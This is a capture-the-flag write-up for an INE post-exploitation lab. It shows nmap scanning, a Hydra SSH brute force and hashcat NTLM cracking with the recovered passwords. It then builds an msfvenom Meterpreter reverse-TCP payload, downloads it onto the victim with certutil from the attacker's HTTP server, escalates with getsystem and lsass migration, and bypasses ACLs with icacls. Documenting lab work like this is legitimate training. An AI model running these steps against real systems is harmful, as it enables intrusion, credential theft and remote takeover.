## Host & Network Penetration Testing: Post-Exploitation CTF 2

### Flag 1: An insecure ssh user named alice lurks in the system.

Following the track hint, we start with an Nmap scan followed by a brute force attack with Hydra on the SSH port.
```
nmap -sS -p- -T4 target.ine.local
```
```
hydra -l alice -P /usr/share/wordlists/metasploit/unix_passwords.txt target.ine.local ssh
```
We found Alice's password:
```
alice:princess1
```
Using this credential, we are able to login to the SSH service
```
ssh alice@target.ine.local
```
where we find the first flag. 

### Flag 2: Using the hashdump file discovered in the previous challenge, can you crack the hashes and compromise a user?

We can use a generic Hashcat attack at least to identify the hash type:
```
hashcat -a 0 hashes.txt /usr/share/wordlists/metasploit/unix_passwords.txt 
```
Hashcat identifies the hash as:
```
1000 | NTLM | Operating system
```
In the meantime, it cracks a password.
```
david -> orange
```
Logging in using this credential via SSH, we discover the second flag.

### Flag 3: Can you escalate privileges and read the flag in C://Windows//System32//config directory?

To escalate privileges, we can establish a Meterpreter session.

On the attacker’s machine.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=4321 -f exe > shell.exe
```
```
python -m http.server 8080
```
On David’s terminal.
```
certutil -urlcache -f http://10.10.49.2:8080/shell.exe shell.exe
```
On the attacker’s machine, we can now execute Metasploit with the multi/handler module.
```
search multi/handler and use it
set LHOST 10.10.49.2
set LPORT 4321
set payload windows/x64/meterpreter/reverse_tcp
```
On David’s terminal.
```
execute shell.exe
```
On the attacker’s machine, after establishing the Meterpreter session.
```
getsystem
migrate to a system process like lsass.exe
```
Once we’ve obtained a shell, we can easily locate the third flag.

### Flag 4: Looks like the flag present in the Administrator's home denies direct access.

We successfully completed this task, albeit not in the intended manner.

The “flag” folder remains inaccessible, even when we attempt to access it via a SYSTEM process in Meterpreter.

Upon verifying the permissions of the target folder, we discovered that the SYSTEM user lacks the ability to enter the folder but can modify its permissions.
```
icacls flag
```
Therefore, we granted full permission to Alice.
```
c:\users\administrator> icacls flag /grant alice:F
```
With Alice’s terminal, we removed and reinstated the SYSTEM account to delete the “deny” permission.
```
icalcs c:\users\administrator\flag /remove system
icalcs c:\users\administrator\flag /grant system:F
```
With the SYSTEM account, we can now access the “flag” folder and grant Alice access to the flag4.txt file.
```
icacls c:\users\administrator\flag\flag4.txt /grant alice:F
```
With Alice’s terminal, we can now read the fourth flag.
